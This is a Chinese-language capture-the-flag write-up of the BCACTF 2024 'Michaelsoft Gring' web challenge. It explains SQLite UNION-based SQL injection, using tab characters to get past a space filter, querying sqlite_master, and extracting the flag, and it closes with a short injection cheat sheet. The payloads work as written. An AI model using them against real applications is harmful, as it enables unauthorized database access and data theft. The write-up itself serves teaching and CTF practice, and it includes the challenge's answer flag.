---
date: 2026-11-21 23:00:00
slug: bcactf2024-michaelsoft-gring
categories:
  - SQL注入
  - Web
---

# [BCACTF 2024] Michaelsoft Gring — 空格被过滤，就用 Tab

> **题目类型**：SQLite 联合查询注入 — 空格绕过
>
> **Flag**：`bcactf{59L_1n1ECTeD_026821}`

---

## 题目概述

**题目直接告诉你是 sqlite。**这省掉了一大半判断成本——**不用再去猜 `information_schema` 还是 `sqlite_master`。**

---

## 解题过程

### Step 1：确认注入点

**搜索框输入单引号 `'`，报错。注入点确认。**

### Step 2：空格被过滤了

**正常 payload 里的空格全被吃掉，SQL 拼不起来。**

**常见的替代方案有三种，但这里只有一种能用：**

| 替代写法 | 能不能用 | 原因 |
| --- | --- | --- |
| `/**/`（注释当空格） | ❌ | **`/` 在 URL 里会被当成路径分隔符**，服务器直接致命错误 |
| `%20` | ❌ | 就是空格本体，一样被过滤 |
| **`%09`（Tab）** | ✅ | **Tab 在 SQL 里和空格等价，且不在过滤名单里** |

**所以后面所有 payload 里的空格都写成 `%09`。**

### Step 3：确定列数

```sql
1' UNION SELECT 1-- 
```

**URL 编码后：**

```text
1'%09UNION%09SELECT%091--
```

**只有一列。**（多给几列会报错“SELECT 列数不一致”）

### Step 4：爆表（SQLite 的关键点）

**SQLite 没有 `information_schema`，表结构存在 `sqlite_master` 里：**

```sql
1' UNION SELECT group_concat(name) FROM sqlite_master--
```

```text
1'%09UNION%09SELECT%09group_concat(name)%09FROM%09sqlite_master--
```

**返回：`search,flag`**

**两张表：`search` 是正常业务表，`flag` 是目标。**

### Step 5：拿 flag——两种做法

**① 直接查那一列**

```sql
1' UNION SELECT group_concat(flag) FROM flag--
```

**② 更省事：查建表语句，一次看到表名+列名**

```sql
1' UNION SELECT group_concat(sql) FROM sqlite_master--
```

**返回类似：**

```sql
CREATE TABLE flag(flag TEXT)
```

**看到 `flag(flag)`，就知道表名和列名都是 `flag`——一条语句搞定“爆表 + 爆列”。**

**最终：**

```text
bcactf{59L_1n1ECTeD_026821}
```

---

| 关键点 | 说明 |
| --- | --- |
| 数据库 | 题目直接说是 sqlite，省掉指纹判断 |
| 注入点 | 单引号报错 |
| 空格过滤 | 用 `%09`（Tab）替代；`/**/` 不行，因为 `/` 在 URL 里是路径符 |
| 列数 | 1 列 |
| 表结构 | SQLite 用 `sqlite_master`，字段有 `type`、`name`、`sql` |
| 一次的取全 | `group_concat(sql)` 能直接拿到建表语句 |
| 注释 | `--` 后面要跟空格（这里用 `--%09` 或直接 `--` 结尾） |

---

??? note "SQLite 注入速查"

    ```sql
    -- 表清单
    SELECT group_concat(name) FROM sqlite_master WHERE type='table'

    -- 建表语句（表名+列名一次看全）
    SELECT group_concat(sql) FROM sqlite_master

    -- 拿数据
    SELECT group_concat(flag) FROM flag
    ```

    **SQLite 没有的东西：**
    ```
    information_schema    ✗
    load_file()           ✗
    INTO OUTFILE          ✗（默认）
    ```
    **所以 sqlite 题基本是“把库读干净”，不是 getshell。**

??? note "这题踩的坑"

    **① 用 `/**/` 代替空格**

    **URL 里的 `/` 会被服务器当路径处理，直接致命错误**，请求还没到 SQL 就挂了。**这种情况下只能用 `%09` 或 `%0a`。**

    **② 想查 `information_schema`**

    **SQLite 里根本没有这张表。**表结构在 `sqlite_master`。

    **③ 只爆表不爆列**

    **`group_concat(sql)` 一条就能同时拿到表名和列名**，比先爆表再爆列少两步。

    **④ payload 忘记以 `1'` 开头**

    **前面的 `1'` 是用来闭合原查询的引号的**，单写 `UNION SELECT` 拼进去是语法错误。
